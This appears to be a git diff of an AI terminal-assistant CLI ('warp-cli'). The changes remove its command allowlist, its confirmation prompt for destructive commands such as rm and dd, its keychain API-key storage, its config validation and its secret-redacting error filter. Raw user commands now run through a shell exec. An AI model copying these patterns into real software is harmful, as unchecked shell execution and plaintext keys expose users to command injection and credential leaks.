 export class OllamaProvider extends BaseLLMProvider {
   name = 'ollama';
@@ -19,7 +10,7 @@ export class OllamaProvider extends BaseLLMProvider {
     const endpoint = effectiveConfig.endpoint || 'http://localhost:11434';
 
     try {
-      const response = await limitedFetch(`${endpoint}/api/chat`, {
+      const response = await fetch(`${endpoint}/api/chat`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -50,7 +41,7 @@ export class OllamaProvider extends BaseLLMProvider {
     const endpoint = effectiveConfig.endpoint || 'http://localhost:11434';
 
     try {
-      const response = await limitedFetch(`${endpoint}/api/chat`, {
+      const response = await fetch(`${endpoint}/api/chat`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
diff --git a/warp-cli/src/providers/openai.provider.ts b/warp-cli/src/providers/openai.provider.ts
index 06e51c3..24b8379 100644
--- a/warp-cli/src/providers/openai.provider.ts
+++ b/warp-cli/src/providers/openai.provider.ts
@@ -1,7 +1,6 @@
 import OpenAI from 'openai';
 import { BaseLLMProvider } from './base.provider';
 import { LLMConfig, Message } from '../types';
-import { secureConfigService } from '../services/secure-config.service';
 
 export class OpenAIProvider extends BaseLLMProvider {
   name = 'openai';
@@ -9,12 +8,10 @@ export class OpenAIProvider extends BaseLLMProvider {
 
   async initialize(config: LLMConfig): Promise<void> {
     await super.initialize(config);
-    // Fetch API key from secure storage
-    const apiKey = await secureConfigService.getApiKey('openai');
-    if (!apiKey) {
-      throw new Error('OpenAI API key is required. Please set it using the config command.');
+    if (!config.apiKey) {
+      throw new Error('OpenAI API key is required');
     }
-    this.client = new OpenAI({ apiKey });
+    this.client = new OpenAI({ apiKey: config.apiKey });
   }
 
   async chat(messages: Message[], config?: Partial<LLMConfig>): Promise<string> {
diff --git a/warp-cli/src/services/autocomplete.service.ts b/warp-cli/src/services/autocomplete.service.ts
deleted file mode 100644
index 2c049ff..0000000
--- a/warp-cli/src/services/autocomplete.service.ts
+++ /dev/null
@@ -1,52 +0,0 @@
-import { PluginService } from './plugin.service';
-
-export interface AutocompleteSuggestion {
-  value: string;
-  description?: string;
-}
-
-const BASE_COMMANDS: AutocompleteSuggestion[] = [
-  { value: '/help', description: 'Show help menu' },
-  { value: '/clear', description: 'Clear the terminal output' },
-  { value: '/new', description: 'Start a new session' },
-  { value: '/save', description: 'Save current session' },
-  { value: '/load', description: 'Load a session by id' },
-  { value: '/list', description: 'List sessions' },
-  { value: '/search', description: 'Search sessions' },
-  { value: '/export', description: 'Export a session' },
-  { value: '/config', description: 'Show configuration' },
-  { value: '/provider', description: 'Switch provider' },
-  { value: '/model', description: 'Set model' },
-  { value: '/context', description: 'Show context snapshot' },
-  { value: '/ctxfile', description: 'Manage context file attachments' },
-  { value: '/diff', description: 'Show git diff' },
-  { value: '/exec', description: 'Execute shell command' },
-  { value: '/git', description: 'Run git command' },
-  { value: '/stats', description: 'Session statistics' },
-  { value: '/explain', description: 'Explain a command' },
-  { value: '/suggest', description: 'Suggest a command' },
-  { value: '/plugins', description: 'List installed plugins' },
-  { value: '/plugin', description: 'Run a plugin' },
-  { value: '/undo', description: 'Undo last chat interaction' },
-  { value: '/autocomplete', description: 'Show suggestions for prefix' }
-];
-
-export class AutocompleteService {
-  constructor(private readonly pluginService: PluginService) {}
-
-  suggest(prefix: string): AutocompleteSuggestion[] {
-    if (!prefix) return [];
-    const normalized = prefix.startsWith('/') ? prefix.toLowerCase() : `/${prefix.toLowerCase()}`;
-
-    const baseMatches = BASE_COMMANDS.filter(item => item.value.startsWith(normalized));
-
-    const pluginMatches = this.pluginService.listPlugins()
-      .map(plugin => ({
-        value: `/plugin ${plugin.name}`,
-        description: plugin.description
-      }))
-      .filter(item => item.value.toLowerCase().startsWith(normalized));
-
-    return [...baseMatches, ...pluginMatches].slice(0, 10);
-  }
-}
diff --git a/warp-cli/src/services/chat.service.ts b/warp-cli/src/services/chat.service.ts
index b2d433c..9775dde 100644
--- a/warp-cli/src/services/chat.service.ts
+++ b/warp-cli/src/services/chat.service.ts
@@ -1,146 +1,191 @@
-import { Message, LLMConfig, LLMProvider } from '../types';
-import { ProviderFactory } from '../providers';
-import { SessionService } from './session.service';
-import { ContextService } from './context.service';
-import { ConfigService } from './config.service';
-import { WarpUIRenderer } from '../ui/renderer';
-
-type ChatServiceDeps = {
-  providerFactory: ProviderFactory;
-  sessionService: SessionService;
-  contextService: ContextService;
-  configService: ConfigService;
-  uiRenderer: WarpUIRenderer;
-};
+import { Message, LLMConfig, LLMProvider } from "../types";
+import { providerFactory } from "../providers";
+import { sessionService } from "./session.service";
+import { contextService } from "./context.service";
+import { configService } from "./config.service";
+import { uiRenderer } from "../ui/renderer";
 
 export class ChatService {
   private currentProvider?: LLMProvider;
-  private readonly providerFactory: ProviderFactory;
-  private readonly sessionService: SessionService;
-  private readonly contextService: ContextService;
-  private readonly configService: ConfigService;
-  private readonly uiRenderer: WarpUIRenderer;
-
-  constructor({ providerFactory, sessionService, contextService, configService, uiRenderer }: ChatServiceDeps) {
-    this.providerFactory = providerFactory;
-    this.sessionService = sessionService;
-    this.contextService = contextService;
-    this.configService = configService;
-    this.uiRenderer = uiRenderer;
-  }
 
   async initialize(): Promise<void> {
-    await this.switchProvider(this.configService.get('defaultProvider'));
+    await this.switchProvider(configService.get("defaultProvider"));
   }
 
-  async switchProvider(providerName: 'ollama' | 'openai' | 'anthropic' | 'gemini'): Promise<void> {
-    const providerConfig = this.configService.getProviderConfig(providerName);
+  async switchProvider(
+    providerName: "ollama" | "openai" | "anthropic" | "gemini",
+  ): Promise<void> {
+    const providerConfig = configService.getProviderConfig(providerName);
 
     if (!providerConfig) {
-      throw new Error(`Provider ${providerName} is not configured`);
+      const defaultConfig: any = {
+        ollama: {
+          endpoint: "http://localhost:11434",
+          model: "openhermes:7b-mistral-v2.5-q4_K_M",
+        },
+        openai: { model: "gpt-4" },
+        anthropic: { model: "claude-3-sonnet" },
+        gemini: { model: "gemini-1.5-flash" },
+      };
+
+      configService.setProviderConfig(
+        providerName,
+        defaultConfig[providerName],
+      );
     }
 
     const config: LLMConfig = {
       provider: providerName,
       model: (providerConfig as any).model,
+      apiKey: (providerConfig as any).apiKey,
       endpoint: (providerConfig as any).endpoint,
       temperature: 0.7,
       maxTokens: 2000,
-      topP: 0.9
+      topP: 0.9,
     };
 
-    this.currentProvider = await this.providerFactory.getProvider(config);
+    this.currentProvider = await providerFactory.getProvider(config);
+
+    if (!this.currentProvider) {
+      throw new Error(`Failed to initialize ${providerName} provider`);
+    }
 
     const isAvailable = await this.currentProvider.isAvailable();
     if (!isAvailable) {
-      throw new Error(`Provider ${providerName} is not available. Please check your configuration.`);
+      throw new Error(
+        `Provider ${providerName} is not available. Please check your configuration.`,
+      );
     }
   }
 
-  async chat(userMessage: string, options?: { streaming?: boolean }): Promise<string> {
+  async switchProviderWithFallback(
+    providerName: "ollama" | "openai" | "anthropic" | "gemini",
+  ): Promise<void> {
+    const fallbackProviders = [
+      "ollama",
+      "openai",
+      "anthropic",
+      "gemini",
+    ] as const;
+    const startIndex = fallbackProviders.indexOf(providerName);
+    const orderedProviders = [
+      ...fallbackProviders.slice(startIndex),
+      ...fallbackProviders.slice(0, startIndex),
+    ];
+
+    for (const provider of orderedProviders) {
+      try {
+        await this.switchProvider(provider);
+        if (provider !== providerName) {
+          uiRenderer.renderInfo(`Fallback to ${provider} provider`);
+        }
+        return;
+      } catch (error) {
+        uiRenderer.renderWarning(
+          `Provider ${provider} failed: ${(error as Error).message}`,
+        );
+        continue;
+      }
+    }
+
+    throw new Error("All providers failed. Please check your configurations.");
+  }
+
+  async chat(
+    userMessage: string,
+    options?: { streaming?: boolean },
+  ): Promise<string> {
     if (!this.currentProvider) {
-      throw new Error('No provider initialized');
+      throw new Error("No provider initialized");
     }
 
-    const session = this.sessionService.getCurrentSession();
+    const session = sessionService.getCurrentSession();
     if (!session) {
-      throw new Error('No active session');
+      throw new Error("No active session");
     }
 
-    const userMsg = this.sessionService.addMessage('user', userMessage);
-    this.uiRenderer.renderMessage(userMsg);
+    const userMsg = sessionService.addMessage("user", userMessage);
+    uiRenderer.renderMessage(userMsg);
 
-    const context = await this.contextService.getContext();
-    const systemPrompt = this.contextService.buildSystemPrompt(context);
+    const context = await contextService.getContext();
+    const systemPrompt = contextService.buildSystemPrompt(context);
 
     const messages: Message[] = [
       {
-        id: 'system',
-        role: 'system',
+        id: "system",
+        role: "system",
         content: systemPrompt,
-        timestamp: new Date()
+        timestamp: new Date(),
       },
-      ...this.sessionService.getLastNMessages(this.configService.get('context').maxHistory)
+      ...sessionService.getLastNMessages(
+        configService.get("context").maxHistory,
+      ),
     ];
 
     try {
-      let response: string;
+      let response = "";
 
       if (options?.streaming && this.currentProvider.streamChat) {
-        this.uiRenderer.startStreamingResponse();
+        uiRenderer.startStreamingResponse();
         const chunks: string[] = [];
 
         for await (const chunk of this.currentProvider.streamChat(messages)) {
           chunks.push(chunk);
-          this.uiRenderer.renderStreamingChunk(chunk);
+          uiRenderer.renderStreamingChunk(chunk);
         }
 
-        this.uiRenderer.endStreamingResponse();
-        response = chunks.join('');
+        uiRenderer.endStreamingResponse();
+        response = chunks.join("");
       } else {
-        this.uiRenderer.renderLoading('Thinking...');
+        uiRenderer.renderLoading("Thinking...");
         response = await this.currentProvider.chat(messages);
-        this.uiRenderer.stopLoading();
+        uiRenderer.stopLoading();
       }
 
-      const assistantMsg = this.sessionService.addMessage('assistant', response, {
+      const assistantMsg = sessionService.addMessage("assistant", response, {
         provider: this.currentProvider.name,
-        model: this.configService.get('defaultProvider')
+        model: configService.get("defaultProvider"),
       });
 
       if (!options?.streaming) {
-        this.uiRenderer.renderMessage(assistantMsg);
+        uiRenderer.renderMessage(assistantMsg);
       }
 
       return response;
     } catch (error: any) {
-      this.uiRenderer.stopLoading();
-      throw new Error(`Chat error: ${error.message}`);
+      uiRenderer.stopLoading();
+      throw new Error(`Chat error: ${(error as Error).message}`);
     }
   }
 
   async executeCommand(command: string): Promise<void> {
-    this.uiRenderer.renderLoading(`Executing: ${command}`);
+    uiRenderer.renderLoading(`Executing: ${command}`);
 
     try {
-      const result = await this.contextService.executeCommand(command);
-      this.uiRenderer.stopLoading();
+      const result = await contextService.executeCommand(command);
+      uiRenderer.stopLoading();
 
       if (result.error) {
-        this.uiRenderer.renderWarning('Command completed with warnings');
+        uiRenderer.renderWarning("Command completed with warnings");
       }
 
-      this.uiRenderer.renderCodeBlock(result.output, 'shell');
-
-      this.sessionService.addMessage('system', `Command: ${command}\n\nOutput:\n${result.output}`, {
-        type: 'command_execution',
-        command,
-        output: result.output,
-        error: result.error
-      });
+      uiRenderer.renderCodeBlock(result.output, "shell");
+
+      sessionService.addMessage(
+        "system",
+        `Command: ${command}\n\nOutput:\n${result.output}`,
+        {
+          type: "command_execution",
+          command,
+          output: result.output,
+          error: result.error,
+        },
+      );
     } catch (error: any) {
-      this.uiRenderer.stopLoading();
-      this.uiRenderer.renderError(`Command execution failed: ${error.message}`);
+      uiRenderer.stopLoading();
+      uiRenderer.renderError(
+        `Command execution failed: ${(error as Error).message}`,
+      );
     }
   }
 
@@ -160,15 +205,19 @@ export class ChatService {
   }
 
   getCurrentProvider(): string {
-    return this.currentProvider?.name || 'none';
+    return this.currentProvider?.name || "none";
   }
 
-  async checkProviderStatus(): Promise<{ provider: string; available: boolean; error?: string }> {
+  async checkProviderStatus(): Promise<{
+    provider: string;
+    available: boolean;
+    error?: string;
+  }> {
     if (!this.currentProvider) {
       return {
-        provider: 'none',
+        provider: "none",
         available: false,
-        error: 'No provider initialized'
+        error: "No provider initialized",
       };
     }
 
@@ -176,14 +225,16 @@ export class ChatService {
       const available = await this.currentProvider.isAvailable();
       return {
         provider: this.currentProvider.name,
-        available
+        available,
       };
     } catch (error: any) {
       return {
         provider: this.currentProvider.name,
         available: false,
-        error: error.message
+        error: (error as Error).message,
       };
     }
   }
 }
+
+export const chatService = new ChatService();
diff --git a/warp-cli/src/services/config.service.ts b/warp-cli/src/services/config.service.ts
index 03c0189..c637440 100644
--- a/warp-cli/src/services/config.service.ts
+++ b/warp-cli/src/services/config.service.ts
@@ -1,39 +1,7 @@
-import { z } from 'zod';
-// Zod schema for config validation
-const ProviderConfigSchema = z.object({
-  model: z.string().min(1).optional(),
-  endpoint: z.string().url().optional(),
-  apiKey: z.string().min(1).optional()
-});
-
-const ConfigSchema = z.object({
-  defaultProvider: z.enum(['ollama', 'openai', 'anthropic', 'gemini']),
-  providers: z.object({
-    ollama: ProviderConfigSchema.optional(),
-    openai: ProviderConfigSchema.optional(),
-    anthropic: ProviderConfigSchema.optional(),
-    gemini: ProviderConfigSchema.optional(),
-  }),
-  ui: z.object({
-    theme: z.enum(['dark', 'light']),
-    markdown: z.boolean(),
-    streaming: z.boolean()
-  }),
-  context: z.object({
-    maxHistory: z.number().int().min(1),
-    includeGit: z.boolean(),
-    includeFiles: z.boolean(),
-    autoContext: z.boolean()
-  }),
-  session: z.object({
-    autosave: z.boolean(),
-    directory: z.string()
-  })
-});
 import Conf from 'conf';
 import * as path from 'path';
 import * as os from 'os';
-import { Config, ProviderName, ProviderSettings } from '../types';
+import { Config } from '../types';
 
 export class ConfigService {
   private config: Conf<Config>;
@@ -67,15 +35,6 @@ export class ConfigService {
       projectName: 'warp-cli',
       defaults: this.defaultConfig
     });
-    // Validate config on load
-    this.validateConfig(this.config.store);
-  }
-  validateConfig(config: any): void {
-    try {
-      ConfigSchema.parse(config);
-    } catch (err: any) {
-      throw new Error('Invalid configuration: ' + (err?.message || err));
-    }
   }
 
   get<K extends keyof Config>(key: K): Config[K] {
@@ -84,8 +43,6 @@ export class ConfigService {
 
   set<K extends keyof Config>(key: K, value: Config[K]): void {
     this.config.set(key, value);
-    // Validate the updated configuration
-    this.validateConfig(this.config.store);
   }
 
   getAll(): Config {
@@ -97,40 +54,16 @@ export class ConfigService {
     this.config.store = this.defaultConfig;
   }
 
-
-  getProviderConfig(provider: ProviderName): ProviderSettings | undefined {
-    const providerEntry = this.config.get('providers')[provider];
-    if (!providerEntry) return undefined;
-    const { apiKey, ...rest } = providerEntry;
-    return rest;
+  getProviderConfig(provider: 'ollama' | 'openai' | 'anthropic' | 'gemini') {
+    return this.config.get('providers')[provider];
   }
 
-
   setProviderConfig(
-    provider: ProviderName,
-    config: ProviderSettings
+    provider: 'ollama' | 'openai' | 'anthropic' | 'gemini',
+    config: any
   ): void {
-    // Remove apiKey if present
-    const providers = this.config.get('providers');
-    const sanitizedConfig = { ...config };
-    if ('apiKey' in sanitizedConfig) {
-      delete sanitizedConfig.apiKey;
-    }
-    providers[provider] = sanitizedConfig;
-    this.config.set('providers', providers);
-  }
-
-  // Helper to migrate existing apiKeys to secure storage
-  async migrateApiKeysToSecureStorage(secureConfigService: any) {
     const providers = this.config.get('providers');
-    for (const provider of ['openai', 'anthropic', 'gemini'] as ProviderName[]) {
-      const conf = providers[provider];
-      if (conf && conf.apiKey) {
-        await secureConfigService.setApiKey(provider, conf.apiKey);
-        delete conf.apiKey;
-        providers[provider] = conf;
-      }
-    }
+    providers[provider] = config;
     this.config.set('providers', providers);
   }
 
@@ -138,14 +71,14 @@ export class ConfigService {
     return this.config.get('session').directory;
   }
 
-  isProviderConfigured(provider: ProviderName): boolean {
+  isProviderConfigured(provider: 'ollama' | 'openai' | 'anthropic' | 'gemini'): boolean {
     const providerConfig = this.getProviderConfig(provider);
     if (!providerConfig) return false;
 
     if (provider === 'ollama') {
       return !!(providerConfig as any).endpoint;
     } else {
-      return true;
+      return !!(providerConfig as any).apiKey;
     }
   }
 
@@ -156,11 +89,11 @@ export class ConfigService {
   importConfig(configString: string): void {
     try {
       const importedConfig = JSON.parse(configString);
-      this.validateConfig(importedConfig);
       this.config.store = { ...this.defaultConfig, ...importedConfig };
     } catch (error) {
-      const message = (error as any)?.message || String(error);
-      throw new Error('Invalid configuration format: ' + message);
+      throw new Error('Invalid configuration format');
     }
   }
 }
+
+export const configService = new ConfigService();
diff --git a/warp-cli/src/services/context.service.ts b/warp-cli/src/services/context.service.ts
index 6200fc6..6d2cc44 100644
--- a/warp-cli/src/services/context.service.ts
+++ b/warp-cli/src/services/context.service.ts
@@ -2,27 +2,17 @@ import { simpleGit, SimpleGit } from 'simple-git';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
-import { ContextData, ContextFileAttachment } from '../types';
-import { execFile } from 'child_process';
-import * as readline from 'readline';
-
-// Utility to sanitize error messages (redact secrets)
-export function sanitizeError(error: Error | any): string {
-  let message = error?.message || String(error);
-  // Remove API keys and tokens
-  message = message
-    .replace(/sk-[a-zA-Z0-9]{32,}/g, '[REDACTED]')
-    .replace(/Bearer [a-zA-Z0-9._-]+/g, 'Bearer [REDACTED]')
-    .replace(/api[_-]?key[=:][a-zA-Z0-9]+/gi, 'api_key=[REDACTED]');
-  return message;
-}
+import { ContextData } from '../types';
+import { exec } from 'child_process';
+import { promisify } from 'util';
+
+const execAsync = promisify(exec);
 
 export class ContextService {
   private git: SimpleGit;
   private commandHistory: string[] = [];
   private outputHistory: string[] = [];
   private maxHistory = 50;
-  private attachments: ContextFileAttachment[] = [];
 
   constructor() {
     this.git = simpleGit();
@@ -37,8 +27,7 @@ export class ContextService {
       history: {
         commands: this.commandHistory.slice(-10),
         outputs: this.outputHistory.slice(-5)
-      },
-      files: this.listAttachedFiles()
+      }
     };
 
     // Try to get git info
@@ -64,67 +53,6 @@ export class ContextService {
     return context;
   }
 
-  async attachFile(filePath: string, options?: { maxPreviewLines?: number }): Promise<ContextFileAttachment> {
-    if (!filePath) {
-      throw new Error('Please provide a file path to attach.');
-    }
-
-    const resolved = path.resolve(process.cwd(), filePath);
-    const stats = await fs.promises.stat(resolved);
-    if (!stats.isFile()) {
-      throw new Error('Only regular files can be attached to context.');
-    }
-
-    const preview = await this.getFilePreview(resolved, options?.maxPreviewLines ?? 20);
-    const attachment: ContextFileAttachment = {
-      path: path.relative(process.cwd(), resolved) || path.basename(resolved),
-      size: stats.size,
-      preview,
-      updated: stats.mtime.toISOString()
-    };
-
-    this.attachments = this.attachments.filter(item => item.path !== attachment.path);
-    this.attachments.push(attachment);
-    return attachment;
-  }
-
-  listAttachedFiles(): ContextFileAttachment[] {
-    return [...this.attachments];
-  }
-
-  removeAttachedFile(identifier: string): boolean {
-    if (!identifier) return false;
-    const normalized = this.normalizeAttachmentId(identifier);
-    const before = this.attachments.length;
-    this.attachments = this.attachments.filter(item => {
-      const itemId = item.path.toLowerCase();
-      const basename = path.basename(item.path).toLowerCase();
-      return itemId !== normalized && basename !== normalized;
-    });
-    return before !== this.attachments.length;
-  }
-
-  clearAttachedFiles(): void {
-    this.attachments = [];
-  }
-
-  async getDiff(target?: string, options: { staged?: boolean; context?: number } = {}): Promise<string> {
-    const isRepo = await this.git.checkIsRepo();
-    if (!isRepo) {
-      throw new Error('Diff is only available inside a git repository.');
-    }
-
-    const args = ['diff'];
-    if (options.staged) args.push('--staged');
-    if (options.context !== undefined) args.push(`-U${options.context}`);
-    if (target) {
-      args.push('--', target);
-    }
-
-    const diff = await this.git.raw(args);
-    return diff.trim() || 'No changes detected.';
-  }
-
   private async getSystemInfo() {
     const shell = process.env.SHELL || 'unknown';
 
@@ -275,81 +203,32 @@ export class ContextService {
     this.outputHistory = [];
   }
 
-  // Whitelisted commands for /exec
-  private static ALLOWED_COMMANDS = [
-    'ls', 'pwd', 'cat', 'echo', 'whoami', 'date', 'git', 'npm', 'yarn', 'pnpm', 'node', 'python', 'python3', 'pip', 'pip3', 'cargo', 'go', 'java', 'javac', 'npx', 'tsc', 'make', 'gcc', 'g++', 'clang', 'docker', 'grep', 'find', 'head', 'tail', 'du', 'df', 'free', 'top', 'htop', 'ps', 'kill', 'uname', 'which', 'whereis', 'tree', 'stat', 'chmod', 'chown', 'curl', 'wget', 'ifconfig', 'ip', 'ping', 'traceroute', 'ssh', 'scp', 'rsync', 'zip', 'unzip', 'tar', 'gzip', 'bzip2', 'xz'
-  ];
-
-  // Added logging for executed commands
-  private logCommandExecution(command: string): void {
-    console.log(`[Command Execution] ${command}`);
-  }
-
   async executeCommand(command: string): Promise<{ output: string; error?: string }> {
     this.addCommand(command);
-    this.logCommandExecution(command); // Log the command execution
-
-    // Parse command and args
-    const [cmd, ...args] = command.trim().split(/\s+/);
-    if (!ContextService.ALLOWED_COMMANDS.includes(cmd)) {
-      const errorMsg = `Command not allowed: ${cmd}`;
-      this.addOutput(errorMsg);
-      return { output: '', error: errorMsg };
-    }
-
-    // Ask for user confirmation for potentially dangerous commands
-    if (["rm", "mv", "dd", "shutdown", "reboot", "kill", "chmod", "chown"].includes(cmd)) {
-      const confirmed = await this.promptConfirm(`Are you sure you want to execute: ${command}? (y/N): `);
-      if (!confirmed) {
-        const msg = 'Command cancelled by user.';
-        this.addOutput(msg);
-        return { output: msg };
-      }
-    }
 
     try {
-      const result = await new Promise<{ stdout: string; stderr: string }>((resolve, reject) => {
-        execFile(cmd, args, {
-          cwd: process.cwd(),
-          maxBuffer: 1024 * 1024 * 10,
-          timeout: 10000
-        }, (error, stdout, stderr) => {
-          if (error) {
-            reject(error);
-          } else {
-            resolve({ stdout, stderr });
-          }
-        });
+      const { stdout, stderr } = await execAsync(command, {
+        cwd: process.cwd(),
+        maxBuffer: 1024 * 1024 * 10 // 10MB
       });
-      const output = result.stdout + (result.stderr || '');
+
+      const output = stdout + (stderr || '');
       this.addOutput(output);
+
       return {
         output,
-        error: result.stderr || undefined
+        error: stderr || undefined
       };
     } catch (error: any) {
-      const errorMsg = sanitizeError(error) || 'Command execution failed';
+      const errorMsg = error.message || 'Command execution failed';
       this.addOutput(errorMsg);
       return {
-        output: '',
+        output: error.stdout || '',
         error: errorMsg
       };
     }
   }
 
-  private async promptConfirm(message: string): Promise<boolean> {
-    return new Promise((resolve) => {
-      const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-      });
-      rl.question(message, (answer) => {
-        rl.close();
-        resolve(/^y(es)?$/i.test(answer.trim()));
-      });
-    });
-  }
-
   buildSystemPrompt(context: ContextData): string {
     let prompt = `You are an AI coding assistant integrated into a CLI terminal. Be helpful, concise, and practical.\n\n`;
     prompt += `Current Context:\n`;
@@ -380,13 +259,6 @@ export class ContextService {
       });
     }
 
-    if (context.files && context.files.length > 0) {
-      prompt += `\nAttached Files:\n`;
-      context.files.forEach((file, idx) => {
-        prompt += `${idx + 1}. ${file.path} (${file.size} bytes)\n`;
-      });
-    }
-
     prompt += `\nCapabilities:\n`;
     prompt += `- Answer coding questions\n`;
     prompt += `- Explain commands and errors\n`;
@@ -397,28 +269,6 @@ export class ContextService {
 
     return prompt;
   }
-
-  private async getFilePreview(filePath: string, maxLines: number): Promise<string> {
-    const handle = await fs.promises.open(filePath, 'r');
-    try {
-      const stats = await handle.stat();
-      const maxBytes = 200_000;
-      const length = Math.min(stats.size, maxBytes);
-      const buffer = Buffer.alloc(length);
-      await handle.read(buffer, 0, length, 0);
-      return buffer
-        .toString('utf8')
-        .split(/\r?\n/)
-        .slice(0, maxLines)
-        .join('\n');
-    } finally {
-      await handle.close();
-    }
-  }
-
-  private normalizeAttachmentId(identifier: string): string {
-    const resolved = path.resolve(process.cwd(), identifier);
-    const relative = path.relative(process.cwd(), resolved);
-    return relative ? relative.toLowerCase() : path.basename(resolved).toLowerCase();
-  }
 }
+
+export const contextService = new ContextService();
diff --git a/warp-cli/src/services/plugin.service.ts b/warp-cli/src/services/plugin.service.ts
deleted file mode 100644
index 0e11628..0000000
--- a/warp-cli/src/services/plugin.service.ts
+++ /dev/null
@@ -1,121 +0,0 @@
-import * as fs from 'fs';
-import * as path from 'path';
-import * as os from 'os';
-import { ContextData, PluginRunResult, PluginSummary, WarpPlugin } from '../types';
-
-interface LoadedPlugin extends WarpPlugin {
-  source: 'builtin' | 'external';
-  filePath?: string;
-}
-
-export class PluginService {
-  private readonly pluginDir: string;
-  private plugins = new Map<string, LoadedPlugin>();
-
-  constructor(pluginDir = path.join(os.homedir(), '.warp-cli', 'plugins')) {
-    this.pluginDir = pluginDir;
-  }
-
-  async initialize(): Promise<void> {
-    await fs.promises.mkdir(this.pluginDir, { recursive: true });
-    this.registerBuiltins();
-    await this.loadExternalPlugins();
-  }
-
-  listPlugins(): PluginSummary[] {
-    return Array.from(this.plugins.values()).map(plugin => ({
-      name: plugin.name,
-      description: plugin.description,
-      version: plugin.version,
-      source: plugin.source
-    }));
-  }
-
-  async execute(name: string, args: string[], context: ContextData): Promise<PluginRunResult> {
-    const plugin = this.plugins.get(name.toLowerCase());
-    if (!plugin) {
-      throw new Error(`Plugin not found: ${name}`);
-    }
-
-    const result = await plugin.run(args, context);
-    if (typeof result === 'string') {
-      return { output: result };
-    }
-    return result || { output: 'Plugin executed without output.' };
-  }
-
-  reload(): Promise<void> {
-    this.plugins.clear();
-    return this.initialize();
-  }
-
-  private registerBuiltins(): void {
-    const builtins: WarpPlugin[] = [
-      {
-        name: 'context-digest',
-        description: 'Summarize current working context, git state, and attachments.',
-        version: '1.0.0',
-        author: 'Warp CLI',
-        run: async (_args, context) => {
-          const lines: string[] = [];
-          lines.push(`Directory: ${context.cwd}`);
-          if (context.git) {
-            lines.push(`Git: ${context.git.branch} (${context.git.status})`);
-          }
-          if (context.project) {
-            lines.push(`Project: ${context.project.type} ‚Äî ${context.project.name}@${context.project.version}`);
-          }
-          if (context.files?.length) {
-            lines.push(`Attachments: ${context.files.map(f => f.path).join(', ')}`);
-          } else {
-            lines.push('Attachments: none');
-          }
-          if (context.history.commands.length) {
-            lines.push('Recent Commands:');
-            context.history.commands.slice(-5).forEach((cmd, idx) => {
-              lines.push(` ${idx + 1}. ${cmd}`);
-            });
-          }
-          return { output: lines.join('\n') };
-        }
-      }
-    ];
-
-    builtins.forEach(plugin => this.register(plugin, 'builtin'));
-  }
-
-  private async loadExternalPlugins(): Promise<void> {
-    const entries = await fs.promises.readdir(this.pluginDir, { withFileTypes: true });
-    for (const entry of entries) {
-      if (!entry.isFile()) continue;
-      const ext = path.extname(entry.name);
-      if (!['.js', '.cjs', '.mjs'].includes(ext)) continue;
-      const filePath = path.join(this.pluginDir, entry.name);
-      await this.loadPluginFile(filePath);
-    }
-  }
-
-  private async loadPluginFile(filePath: string): Promise<void> {
-    try {
-      delete require.cache[require.resolve(filePath)];
-      const mod = require(filePath);
-      const plugin: WarpPlugin | undefined = mod.default || mod.plugin || mod;
-      if (!plugin?.name || typeof plugin.run !== 'function') {
-        console.warn(`Invalid plugin at ${filePath}`);
-        return;
-      }
-      this.register(plugin, 'external', filePath);
-    } catch (error) {
-      console.warn(`Failed to load plugin ${filePath}:`, error);
-    }
-  }
-
-  private register(plugin: WarpPlugin, source: 'builtin' | 'external', filePath?: string): void {
-    const normalizedName = plugin.name.toLowerCase();
-    this.plugins.set(normalizedName, {
-      ...plugin,
-      source,
-      filePath
-    });
-  }
-}
diff --git a/warp-cli/src/services/secure-config.service.ts b/warp-cli/src/services/secure-config.service.ts
deleted file mode 100644
index b95eaa1..0000000
--- a/warp-cli/src/services/secure-config.service.ts
+++ /dev/null
@@ -1,19 +0,0 @@
-import keytar from 'keytar';
-
-const SERVICE_NAME = 'warp-cli';
-
-export class SecureConfigService {
-  async setApiKey(provider: string, apiKey: string): Promise<void> {
-    await keytar.setPassword(SERVICE_NAME, `${provider}-api-key`, apiKey);
-  }
-
-  async getApiKey(provider: string): Promise<string | null> {
-    return await keytar.getPassword(SERVICE_NAME, `${provider}-api-key`);
-  }
-
-  async deleteApiKey(provider: string): Promise<void> {
-    await keytar.deletePassword(SERVICE_NAME, `${provider}-api-key`);
-  }
-}
-
-export const secureConfigService = new SecureConfigService();
diff --git a/warp-cli/src/services/session.service.ts b/warp-cli/src/services/session.service.ts
index fa7d821..496c0f3 100644
--- a/warp-cli/src/services/session.service.ts
+++ b/warp-cli/src/services/session.service.ts
@@ -1,36 +1,30 @@
-import { v4 as uuidv4 } from 'uuid';
-import { Session, Message, SessionContext } from '../types';
-import { SessionStorage } from '../storage/session.storage';
-import { ContextService } from './context.service';
-import { ConfigService } from './config.service';
+import { v4 as uuidv4 } from "uuid";
+import { Session, Message, SessionContext } from "../types";
+import { SessionStorage } from "../storage/session-storage";
+import { contextService } from "./context.service";
+import { configService } from "./config.service";
 
 export class SessionService {
   private currentSession?: Session;
   private storage: SessionStorage;
   private autosaveInterval?: NodeJS.Timeout;
-  private contextService: ContextService;
-  private configService: ConfigService;
-
-  constructor({ contextService, configService, storage }: {
-    contextService: ContextService;
-    configService: ConfigService;
-    storage: SessionStorage;
-  }) {
-    this.contextService = contextService;
-    this.configService = configService;
-    this.storage = storage;
+
+  constructor() {
+    const sessionDir = configService.getSessionDirectory();
+    this.storage = new SessionStorage(sessionDir);
   }
 
   async initialize(): Promise<void> {
     await this.storage.initialize();
+
     // Start autosave if enabled
-    if (this.configService.get('session').autosave) {
+    if (configService.get("session").autosave) {
       this.startAutosave();
     }
   }
 
   async createSession(name?: string): Promise<Session> {
-    const context = await this.contextService.getContext();
+    const context = await contextService.getContext();
 
     const session: Session = {
       id: uuidv4(),
@@ -38,7 +32,7 @@ export class SessionService {
       created: new Date(),
       updated: new Date(),
       messages: [],
-      context: this.convertContextToSessionContext(context)
+      context: this.convertContextToSessionContext(context),
     };
 
     this.currentSession = session;
@@ -55,7 +49,7 @@ export class SessionService {
 
   async saveCurrentSession(): Promise<void> {
     if (!this.currentSession) {
-      throw new Error('No active session to save');
+      throw new Error("No active session to save");
     }
 
     this.currentSession.updated = new Date();
@@ -82,9 +76,13 @@ export class SessionService {
     return this.currentSession;
   }
 
